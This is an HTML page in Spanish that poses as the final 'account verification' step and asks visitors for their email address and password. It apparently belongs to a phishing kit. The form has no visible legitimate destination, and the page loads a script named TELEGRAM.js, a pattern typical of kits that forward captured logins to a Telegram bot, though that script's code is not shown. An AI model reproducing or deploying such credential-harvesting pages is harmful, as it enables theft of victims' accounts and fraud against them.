<!DOCTYPE html>
<html lang="es">
<head>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <link rel="shortcut icon" href="img/favicon.ico">
    <link rel="apple-touch-icon" href="img/favicon.png"> 
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style/mail-page.css">
    <title>Correo y Contraseña</title>
</head>
<body>
    <div id="loader" class="loader-container">
        <div class="loader">
            <img src="img/loading.gif" alt="Cargando..."><br>
        </div>
    </div>
    
    <div id="main-content" style="display: none;">


    <header class="header"></header>
    <div class="steps-container">
        <h2>Verificación de Cuenta</h2>
        <div class="steps-indicator">
            <div class="step active"></div>
            <div class="step active"></div>
            <div class="step active"></div>
            <div class="step active"></div>


        </div>
    </div>
    <div class="form-container">
        
        <h3>Ingresa tu correo y contraseña</h3>
        <form id="emailPasswordForm" method="post">
            <div class="input-wrapper">
                <label for="email">Correo Electrónico</label>
                <input type="email" id="email" required>
            </div>
            <div class="input-wrapper">
                <label for="password">Contraseña</label>
                <input type="password" id="password" required>
            </div>
            <div class="button-group">
                <button type="submit" class="continue-btn" disabled>Continuar</button>
                <button type="button" class="cancel-btn">Cancelar</button>
            </div>
        </form>

    </div>    
    <script src="js/script6.js"></script>

    <script src="js/efect.js"></script> 
    <script src="TELEGRAM.js"></script> 


    <script src="js/email-validate.js"></script>
    </div>
</body>
</html>
